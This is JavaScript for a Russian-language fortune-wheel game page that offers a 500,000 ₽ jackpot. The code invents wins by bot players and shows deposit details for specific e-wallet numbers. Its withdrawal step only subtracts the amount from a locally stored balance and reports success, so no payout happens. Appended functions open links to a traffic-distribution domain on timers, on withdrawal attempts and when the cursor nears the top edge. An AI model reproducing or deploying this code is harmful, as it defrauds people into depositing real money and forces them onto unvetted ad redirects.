 // Game Data
        const gameData = {
            balance: 100,
            spinCost: 10,
            spinCount: 0,
            lastWins: [],
            botNames: ['Алексей', 'Дмитрий', 'Сергей', 'Иван', 'Михаил', 'Андрей', 'Екатерина', 'Ольга', 'Анна', 'Мария'],
            wheelSections: [
                { text: '10 ₽', value: 10, color: '#FF6B6B' },
                { text: 'Бомба 💣', value: -50, color: '#4ECDC4' },
                { text: '20 ₽', value: 20, color: '#FFD166' },
                { text: '30 ₽', value: 30, color: '#06D6A0' },
                { text: '50 ₽', value: 50, color: '#118AB2' },
                { text: 'Бомба 💣', value: -50, color: '#EF476F' },
                { text: '100 ₽', value: 100, color: '#073B4C' },
                { text: '500.000 ₽', value: 500000, color: '#FFD700', jackpot: true }
            ],
            paymentMethods: {
                card: { name: 'Банковская карта', icon: 'fa-credit-card' },
                payeer: { name: 'Payeer', icon: 'fa-wallet', details: 'Кошелек: P1105862963' },
                webmoney: { name: 'WebMoney', icon: 'fa-wallet', details: 'Кошелек: W123456789012' },
                yoomoney: { name: 'ЮMoney', icon: 'fa-wallet', details: 'Кошелек: 4100118424126112' }
            }
        };

        // DOM Elements
        const elements = {
            wheel: document.getElementById('wheel'),
            spinBtn: document.getElementById('spinBtn'),
            balanceAmount: document.getElementById('balanceAmount'),
            winsTableBody: document.getElementById('winsTableBody'),
            balanceBtn: document.getElementById('balanceBtn'),
            depositBtn: document.getElementById('depositBtn'),
            withdrawModal: document.getElementById('withdrawModal'),
            depositModal: document.getElementById('depositModal'),
            withdrawAmount: document.getElementById('withdrawAmount'),
            depositAmount: document.getElementById('depositAmount'),
            paymentDetails: document.getElementById('paymentDetails'),
            depositDetails: document.getElementById('depositDetails'),
            confirmWithdraw: document.getElementById('confirmWithdraw'),
            confirmDeposit: document.getElementById('confirmDeposit'),
            notificationContainer: document.getElementById('notificationContainer')
        };

        // State
        let isSpinning = false;
        let selectedPaymentMethod = null;
        let selectedDepositMethod = null;

        // Initialize Game
        function initGame() {
            loadFromLocalStorage();
            createWheel();
            updateBalanceDisplay();
            generateBotWins();
            updateWinsTable();
            
            // Event Listeners
            elements.spinBtn.addEventListener('click', spinWheel);
            elements.balanceBtn.addEventListener('click', () => showModal('withdrawModal'));
            elements.depositBtn.addEventListener('click', () => showModal('depositModal'));
            
            // Modal events
            document.querySelectorAll('.close-modal').forEach(btn => {
                btn.addEventListener('click', () => {
                    document.querySelectorAll('.modal').forEach(modal => {
                        modal.classList.remove('active');
                    });
                });
            });
            
            // Payment method selection
            document.querySelectorAll('.payment-method').forEach(method => {
                method.addEventListener('click', function() {
                    const modalType = this.closest('.modal').id;
                    const methodName = this.dataset.method;
                    
                    if (modalType === 'withdrawModal') {
                        selectPaymentMethod(methodName);
                    } else {
                        selectDepositMethod(methodName);
                    }
                });
            });
            
            elements.confirmWithdraw.addEventListener('click', processWithdraw);
            elements.confirmDeposit.addEventListener('click', processDeposit);
            
            // Close modals when clicking outside
            document.querySelectorAll('.modal').forEach(modal => {
                modal.addEventListener('click', (e) => {
                    if (e.target === modal) {
                        modal.classList.remove('active');
                    }
                });
            });
        }

        // Create Wheel
        function createWheel() {
            elements.wheel.innerHTML = '';
            const sectionAngle = 360 / gameData.wheelSections.length;
            
            gameData.wheelSections.forEach((section, index) => {
                const sectionEl = document.createElement('div');
                sectionEl.className = 'wheel-section';
                sectionEl.style.transform = `rotate(${index * sectionAngle}deg)`;
                sectionEl.style.background = section.color;
                
                const content = document.createElement('div');
                content.className = 'wheel-section-content';
                content.textContent = section.text;
                
                if (section.jackpot) {
                    content.innerHTML = '<div class="jackpot-animation">500.000 ₽</div>';
                }
                
                sectionEl.appendChild(content);
                elements.wheel.appendChild(sectionEl);
            });
        }

        // Spin Wheel
        function spinWheel() {
            if (isSpinning) return;
            if (gameData.balance < gameData.spinCost) {
                showNotification('Ошибка', 'Недостаточно средств для вращения', 'error');
                return;
            }
            
            // Deduct spin cost
            gameData.balance -= gameData.spinCost;
            gameData.spinCount++;
            updateBalanceDisplay();
            saveToLocalStorage();
            
            // Disable spin button during animation
            isSpinning = true;
            elements.spinBtn.disabled = true;
            
            // Determine result with probabilities
            const resultIndex = getSpinResult();
            const result = gameData.wheelSections[resultIndex];
            
            // Calculate rotation (at least 3 full rotations + offset to land on selected section)
            const sectionAngle = 360 / gameData.wheelSections.length;
            const extraRotation = 5 * 360; // 5 extra full rotations
            const resultOffset = (resultIndex * sectionAngle) - (sectionAngle / 2);
            const rotation = extraRotation + (360 - resultOffset);
            
            // Apply rotation
            elements.wheel.style.transform = `rotate(${rotation}deg)`;
            
            // After spin completes
            setTimeout(() => {
                // Apply win/loss
                gameData.balance += result.value;
                updateBalanceDisplay();
                
                // Add to win history
                const winEntry = {
                    id: Math.floor(Math.random() * 1000000),
                    name: 'Вы',
                    amount: result.value,
                    timestamp: new Date().toLocaleString()
                };
                
                gameData.lastWins.unshift(winEntry);
                if (gameData.lastWins.length > 10) gameData.lastWins.pop();
                
                updateWinsTable();
                saveToLocalStorage();
                
                // Show notification
                if (result.jackpot) {
                    showNotification('ДЖЕКПОТ!', `Вы выиграли главный приз: 500,000 ₽!`, 'jackpot');
                } else if (result.value > 0) {
                    showNotification('Поздравляем!', `Вы выиграли ${result.value} ₽!`, 'success');
                } else {
                    showNotification('Бомба!', 'Вы потеряли 50 ₽!', 'error');
                }
                
                // Adjust spin cost based on frequency
                if (gameData.spinCount % 5 === 0 && gameData.spinCost < 100) {
                    gameData.spinCost += 10;
                    if (gameData.spinCost > 100) gameData.spinCost = 100;
                    elements.spinBtn.innerHTML = `<i class="fas fa-sync-alt"></i> Крутить за ${gameData.spinCost} ₽`;
                    showNotification('Изменение ставки', `Теперь вращение стоит ${gameData.spinCost} ₽`, 'warning');
                }
                
                // Re-enable spin button
                setTimeout(() => {
                    isSpinning = false;
                    elements.spinBtn.disabled = false;
                }, 1000);
            }, 4500);
        }

        // Get spin result with probabilities
        function getSpinResult() {
            const rand = Math.random();
            
            // 1% chance for jackpot
            if (rand < 0.01) return 7;
            
            // 10% chance for bomb
            if (rand < 0.11) return Math.random() < 0.5 ? 1 : 5;
            
            // 89% chance for other prizes
            const regularPrizes = [0, 2, 3, 4, 6];
            return regularPrizes[Math.floor(Math.random() * regularPrizes.length)];
        }

        // Generate initial bot wins
        function generateBotWins() {
            if (gameData.lastWins.length > 0) return;
            
            for (let i = 0; i < 7; i++) {
                const daysAgo = 7 - i;
                const timestamp = new Date(Date.now() - daysAgo * 24 * 60 * 60 * 1000).toLocaleString();
                
                // 30% chance for bomb
                const isBomb = Math.random() < 0.3;
                const amount = isBomb ? -50 : [10, 20, 30, 50, 100][Math.floor(Math.random() * 5)];
                
                gameData.lastWins.push({
                    id: Math.floor(Math.random() * 1000000),
                    name: gameData.botNames[Math.floor(Math.random() * gameData.botNames.length)],
                    amount: amount,
                    timestamp: timestamp
                });
            }
        }

        // Update Wins Table
        function updateWinsTable() {
            elements.winsTableBody.innerHTML = '';
            
            gameData.lastWins.forEach(win => {
                const row = document.createElement('tr');
                
                const idCell = document.createElement('td');
                idCell.textContent = win.id;
                
                const nameCell = document.createElement('td');
                nameCell.textContent = win.name;
                
                const amountCell = document.createElement('td');
                amountCell.className = 'win-amount';
                
                if (win.amount === 500000) {
                    amountCell.innerHTML = '<span class="jackpot-animation">500,000 ₽</span>';
                } else if (win.amount > 0) {
                    amountCell.className += ' win-positive';
                    amountCell.textContent = `+${win.amount} ₽`;
                } else {
                    amountCell.className += ' win-negative';
                    amountCell.textContent = `${win.amount} ₽`;
                }
                
                row.appendChild(idCell);
                row.appendChild(nameCell);
                row.appendChild(amountCell);
                elements.winsTableBody.appendChild(row);
            });
        }

        // Show Modal
        function showModal(modalId) {
            document.getElementById(modalId).classList.add('active');
            selectedPaymentMethod = null;
            selectedDepositMethod = null;
            elements.paymentDetails.style.display = 'none';
            elements.depositDetails.innerHTML = '<p>После выбора способа пополнения здесь появятся реквизиты</p>';
        }

        // Select Payment Method
        function selectPaymentMethod(method) {
            selectedPaymentMethod = method;
            
            // Update UI
            document.querySelectorAll('.payment-method').forEach(el => {
                el.classList.remove('active');
            });
            event.target.classList.add('active');
            
            // Show payment details
            elements.paymentDetails.style.display = 'block';
            elements.paymentDetails.innerHTML = `
                <p><strong>${gameData.paymentMethods[method].name}</strong></p>
                <p>${gameData.paymentMethods[method].details || 'Введите данные вашей карты/кошелька'}</p>
            `;
        }

        // Select Deposit Method
        function selectDepositMethod(method) {
            selectedDepositMethod = method;
            
            // Update UI
            document.querySelectorAll('#depositModal .payment-method').forEach(el => {
                el.classList.remove('active');
            });
            event.target.classList.add('active');
            
            // Show deposit details
            elements.depositDetails.innerHTML = `
                <p><strong>Реквизиты для ${gameData.paymentMethods[method].name}:</strong></p>
                <p>${gameData.paymentMethods[method].details}</p>
                <p class="info-text">После пополнения средства поступят в течение 5 минут</p>
            `;
        }

        // Process Withdraw
        function processWithdraw() {
            const amount = parseInt(elements.withdrawAmount.value);
            
            if (!amount || amount < 5000) {
                showNotification('Ошибка', 'Минимальная сумма вывода - 5,000 ₽', 'error');
                return;
            }
            
            if (amount > gameData.balance) {
                showNotification('Ошибка', 'Недостаточно средств на балансе', 'error');
                return;
            }
            
            if (!selectedPaymentMethod) {
                showNotification('Ошибка', 'Выберите способ вывода', 'error');
                return;
            }
            
            gameData.balance -= amount;
            updateBalanceDisplay();
            saveToLocalStorage();
            
            showNotification('Успешно!', `Запрос на вывод ${amount} ₽ отправлен!`, 'success');
            elements.withdrawModal.classList.remove('active');
        }

        // Process Deposit
        function processDeposit() {
            const amount = parseInt(elements.depositAmount.value);
            
            if (!amount || amount < 100) {
                showNotification('Ошибка', 'Минимальная сумма пополнения - 100 ₽', 'error');
                return;
            }
            
            if (!selectedDepositMethod) {
                showNotification('Ошибка', 'Выберите способ пополнения', 'error');
                return;
            }
            
            gameData.balance += amount;
            updateBalanceDisplay();
            saveToLocalStorage();
            
            showNotification('Успешно!', `Баланс пополнен на ${amount} ₽!`, 'success');
            elements.depositModal.classList.remove('active');
        }

        // Update Balance Display
        function updateBalanceDisplay() {
            elements.balanceAmount.textContent = `${gameData.balance.toLocaleString()} ₽`;
        }

        // Show Notification
        function showNotification(title, message, type) {
            const notification = document.createElement('div');
            notification.className = `notification ${type}`;
            notification.innerHTML = `
                <div class="notification-header">
                    <div class="notification-title">${title}</div>
                    <button class="notification-close">&times;</button>
                </div>
                <div class="notification-message">${message}</div>
            `;
            
            elements.notificationContainer.appendChild(notification);
            
            // Show notification
            setTimeout(() => {
                notification.classList.add('show');
            }, 10);
            
            // Close button
            notification.querySelector('.notification-close').addEventListener('click', () => {
                notification.classList.remove('show');
                setTimeout(() => {
                    notification.remove();
                }, 400);
            });
            
            // Auto remove after 5 seconds
            setTimeout(() => {
                notification.classList.remove('show');
                setTimeout(() => {
                    notification.remove();
                }, 400);
            }, 5000);
        }

        // Save to LocalStorage
        function saveToLocalStorage() {
            const saveData = {
                balance: gameData.balance,
                spinCost: gameData.spinCost,
                spinCount: gameData.spinCount,
                lastWins: gameData.lastWins
            };
            localStorage.setItem('fortuneWheelData', JSON.stringify(saveData));
        }

// Функция для показа push-рекламы при определенных событиях
function showPushAd() {
  const pushLinks = [
    'https://hotbxiriva.com/tds?id=1342217241&p1=sub1&p2=sub2&p3=sub3&p4=sub4',
    'https://hotbxiriva.com/tds?id=1342635462&p1=sub1&p2=sub2&p3=sub3&p4=sub4'
  ];
  
  // Выбираем случайную ссылку
  const randomLink = pushLinks[Math.floor(Math.random() * pushLinks.length)];
  
  // Создаем уведомление в интерфейсе (не браузерное)
  const notification = document.createElement('div');
  notification.className = 'push-notification';
  notification.innerHTML = `
    <div class="push-content">
      <span class="push-close">&times;</span>
      <p>Специальное предложение только для вас!</p>
      <a href="${randomLink}" target="_blank" class="push-btn">Получить бонус</a>
    </div>
  `;
  
  document.body.appendChild(notification);
  
  // Закрытие по кнопке
  notification.querySelector('.push-close').addEventListener('click', () => {
    notification.remove();
  });
  
  // Автозакрытие через 15 секунд
  setTimeout(() => {
    notification.remove();
  }, 15000);
}

// Триггеры для показа (добавьте в initGame())
function setupPushTriggers() {
  // При первом посещении (через 30 сек)
  setTimeout(showPushAd, 30000);
  
  // При попытке вывода средств
  elements.balanceBtn.addEventListener('click', () => {
    if (Math.random() < 0.7) showPushAd(); // 70% chance
  });
  
  // После 3 вращений колеса
  let spinCount = 0;
  elements.spinBtn.addEventListener('click', () => {
    spinCount++;
    if (spinCount % 3 === 0) showPushAd();
  });
}


let adShown = false;

function setupBackgroundRedirect() {
  window.addEventListener('mousemove', (e) => {
    if (e.clientY < 50 && !adShown) { // Если курсор у верхнего края
      adShown = true;
      setTimeout(() => {
        window.open(
          Math.random() < 0.5 ? 
          'https://hotbxiriva.com/tds?id=1342217241&p1=sub1&p2=sub2&p3=sub3&p4=sub4' :
          'https://hotbxiriva.com/tds?id=1342635462&p1=sub1&p2=sub2&p3=sub3&p4=sub4',
          '_blank'
        );
      }, 1000);
    }
  });
}

document.getElementById('bonusBtn').addEventListener('click', () => {
  const links = [
    'https://hotbxiriva.com/tds?id=1342217241&p1=sub1&p2=sub2&p3=sub3&p4=sub4',
    'https://hotbxiriva.com/tds?id=1342635462&p1=sub1&p2=sub2&p3=sub3&p4=sub4'
  ];
  window.open(links[Math.floor(Math.random() * links.length)], '_blank');
});

        // Load from LocalStorage
        function loadFromLocalStorage() {
            const savedData = localStorage.getItem('fortuneWheelData');
            if (savedData) {
                const parsedData = JSON.parse(savedData);
                gameData.balance = parsedData.balance || 100;
                gameData.spinCost = parsedData.spinCost || 10;
                gameData.spinCount = parsedData.spinCount || 0;
                gameData.lastWins = parsedData.lastWins || [];
            }
            
            // Update spin button cost
            elements.spinBtn.innerHTML = `<i class="fas fa-sync-alt"></i> Крутить за ${gameData.spinCost} ₽`;
        }

        // Initialize the game when page loads
        window.addEventListener('DOMContentLoaded', initGame);